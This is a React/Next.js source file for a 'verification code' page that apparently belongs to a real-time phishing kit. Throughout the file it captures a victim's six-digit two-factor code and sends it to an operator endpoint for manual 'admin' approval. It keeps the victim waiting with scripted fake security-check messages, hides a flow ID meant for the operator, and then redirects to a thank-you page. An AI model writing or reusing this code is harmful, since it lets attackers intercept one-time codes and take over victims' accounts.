"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { getOrCreateFlowId } from "@/lib/session";
import ClientProtection from "@/components/ClientProtection";

const DEFAULT_TIMEOUT_MS = Number(
  process.env.NEXT_PUBLIC_OTP_TIMEOUT_MS || 1500
);

export default function OtpPage() {
  const router = useRouter();
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [flowId, setFlowId] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [approvalError, setApprovalError] = useState("");
  const [processingMessage, setProcessingMessage] = useState(
    "Processing verification code..."
  );
  const [greeting, setGreeting] = useState("Good evening");

  useEffect(() => {
    setFlowId(getOrCreateFlowId());

    // Set dynamic greeting based on time
    const hour = new Date().getHours();
    if (hour < 12) {
      setGreeting("Good morning");
    } else if (hour < 17) {
      setGreeting("Good afternoon");
    } else {
      setGreeting("Good evening");
    }
  }, []);

  // Handle OTP input changes
  const handleOtpChange = (index, value) => {
    if (value.length > 1) return; // Only allow single digit
    if (!/^[0-9]*$/.test(value)) return; // Only allow numbers

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.querySelector(
        `input[data-index="${index + 1}"]`
      );
      if (nextInput) nextInput.focus();
    }
  };

  // Handle keyboard navigation
  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      const prevInput = document.querySelector(
        `input[data-index="${index - 1}"]`
      );
      if (prevInput) prevInput.focus();
    }
    if (e.key === "ArrowLeft" && index > 0) {
      const prevInput = document.querySelector(
        `input[data-index="${index - 1}"]`
      );
      if (prevInput) prevInput.focus();
    }
    if (e.key === "ArrowRight" && index < 5) {
      const nextInput = document.querySelector(
        `input[data-index="${index + 1}"]`
      );
      if (nextInput) nextInput.focus();
    }
  };

  // Handle paste
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData
      .getData("text")
      .replace(/[^0-9]/g, "")
      .slice(0, 6);
    const newOtp = [...otp];

    for (let i = 0; i < pastedData.length && i < 6; i++) {
      newOtp[i] = pastedData[i];
    }
    setOtp(newOtp);

    // Focus the next empty input or the last one
    const nextEmptyIndex = newOtp.findIndex((digit) => !digit);
    const focusIndex = nextEmptyIndex === -1 ? 5 : Math.min(nextEmptyIndex, 5);
    const targetInput = document.querySelector(
      `input[data-index="${focusIndex}"]`
    );
    if (targetInput) targetInput.focus();
  };

  // Cycle through realistic processing messages
  function startProcessingMessages() {
    const messages = [
      "Processing verification code...",
      "Validating security token...",
      "Checking authentication code...",
      "Verifying two-factor authentication...",
      "Confirming security verification...",
      "Finalizing authentication process...",
    ];

    let messageIndex = 0;
    const messageInterval = setInterval(() => {
      messageIndex = (messageIndex + 1) % messages.length;
      setProcessingMessage(messages[messageIndex]);
    }, 3000); // Change message every 3 seconds

    // Store interval ID to clear it later
    window.otpProcessingInterval = messageInterval;
  }

  // Clear processing messages when done
  useEffect(() => {
    if (!waitingForApproval && window.otpProcessingInterval) {
      clearInterval(window.otpProcessingInterval);
      setProcessingMessage("Processing verification code...");
    }
  }, [waitingForApproval]);

  async function handleSubmit(e) {
    e.preventDefault();
    if (submitting || waitingForApproval) return;
    setSubmitting(true);
    setApprovalError("");

    // Generate a new flow ID for each OTP submission
    const newFlowId = getOrCreateFlowId(true); // Force new ID
    setFlowId(newFlowId);

    try {
      // Send OTP to admin for approval
      const response = await fetch("/api/otp-approval", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          flowId: newFlowId,
          otp: otp.join(""),
          meta: { userAgent: navigator.userAgent },
        }),
      });

      if (response.ok) {
        setSubmitting(false);
        setWaitingForApproval(true);

        // Start cycling through processing messages
        startProcessingMessages();

        // Start polling for approval result
        pollForApproval(newFlowId);
      } else {
        throw new Error("Failed to submit for approval");
      }
    } catch (error) {
      console.error("Submission error:", error);
      setSubmitting(false);
      setApprovalError("Verification service unavailable. Please try again.");
    }
  }

  // Poll for approval result
  async function pollForApproval(currentFlowId) {
    const maxAttempts = 120; // 10 minutes max (5 second intervals)
    let attempts = 0;

    const poll = async () => {
      if (attempts >= maxAttempts) {
        setWaitingForApproval(false);
        setApprovalError("Verification timeout. Please try again.");
        return;
      }

      try {
        const response = await fetch(
          `/api/otp-approval/status?flowId=${currentFlowId}`
        );
        const result = await response.json();

        if (result.status === "resolved") {
          setWaitingForApproval(false);

          if (result.approved) {
            // Approved - redirect to thank you page
            router.push("/thank-you");
          } else {
            // Rejected - show error and reset form
            setApprovalError(
              "Invalid verification code. Please check and try again."
            );
            // Reset form after rejection so user can try again
            setTimeout(() => {
              setApprovalError("");
              setOtp(["", "", "", "", "", ""]);
            }, 3000); // Clear error and form after 3 seconds
          }
          return;
        }

        if (result.status === "pending") {
          // Still waiting, continue polling
          attempts++;
          setTimeout(poll, 5000); // Poll every 5 seconds
        } else {
          // Handle unknown status - could be server restart or other issues
          console.log("Approval status unknown:", result);

          // If it's a fallback approval, continue polling
          if (result.fallback) {
            console.log("Fallback approval created, continuing to poll...");
            attempts++;
            setTimeout(poll, 5000);
            return;
          }

          // For other unknown statuses, show a more helpful error
          setWaitingForApproval(false);
          setApprovalError(
            "Verification service temporarily unavailable. Please try again."
          );
          // Auto-clear error after 3 seconds so user can retry quickly
          setTimeout(() => {
            setApprovalError("");
          }, 3000);
        }
      } catch (error) {
        console.error("Polling error:", error);
        attempts++;

        // If we've had too many consecutive errors, show a message
        if (attempts > 10 && attempts % 10 === 0) {
          console.log("Multiple polling errors, but continuing...");
        }

        setTimeout(poll, 5000);
      }
    };

    poll();
  }

  return (
    <ClientProtection>
      <div className="relative min-h-screen bg-white md:bg-[url('/bg.jpg')] bg-cover bg-center">
        <div className="absolute inset-0 hidden md:block bg-black/25" />
        <div className="relative z-10 flex flex-col items-center justify-center min-h-screen px-4 py-12">
          <div className="w-full max-w-lg bg-white rounded-2xl shadow-2xl px-12 py-16">
            <h1 className="text-2xl font-normal text-center mb-2 text-gray-800">
              Enter verification code
            </h1>
            <p className="text-center text-gray-600 mb-8 text-sm leading-relaxed">
              Please enter the 6-digit code sent to your phone to verify your
              identity.
            </p>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="flex justify-center gap-3 mb-2">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    data-index={index}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    className="w-12 h-14 border-2 border-gray-300 rounded-lg text-center text-xl font-semibold text-gray-900 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all"
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    onPaste={handlePaste}
                    disabled={waitingForApproval}
                    autoComplete="one-time-code"
                  />
                ))}
              </div>

              {/* Error Message */}
              {approvalError && (
                <div className="w-full p-3 bg-red-50 border border-red-200 rounded-lg">
                  <div className="flex items-center">
                    <svg
                      className="w-5 h-5 text-red-400 mr-2"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                        clipRule="evenodd"
                      />
                    </svg>
                    <span className="text-sm text-red-700">
                      {approvalError}
                    </span>
                  </div>
                </div>
              )}

              {/* Processing Message */}
              {waitingForApproval && (
                <div className="w-full p-3 bg-blue-50 border border-blue-200 rounded-lg">
                  <div className="flex items-center">
                    <svg
                      className="animate-spin w-5 h-5 text-blue-500 mr-2"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 714 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    <div>
                      <div className="text-sm font-medium text-blue-700">
                        {processingMessage}
                      </div>
                      <div className="text-xs text-blue-600">
                        Please wait while we validate your security code
                      </div>
                    </div>
                  </div>
                </div>
              )}

              <button
                type="submit"
                disabled={submitting || waitingForApproval}
                className={`w-full rounded-full h-12 font-medium disabled:opacity-70 transition-colors ${
                  otp.every((digit) => digit !== "") && !waitingForApproval
                    ? "bg-[#d71f27] text-white hover:bg-[#b91c23]"
                    : "bg-gray-300 text-gray-700 hover:bg-gray-400"
                }`}
              >
                {waitingForApproval
                  ? "Processing..."
                  : submitting
                  ? "Verifying..."
                  : "Verify"}
              </button>
              {/* Flow ID hidden from user - for admin context only */}
              <div className="hidden">Flow ID: {flowId}</div>
            </form>
          </div>
        </div>
      </div>
    </ClientProtection>
  );
}
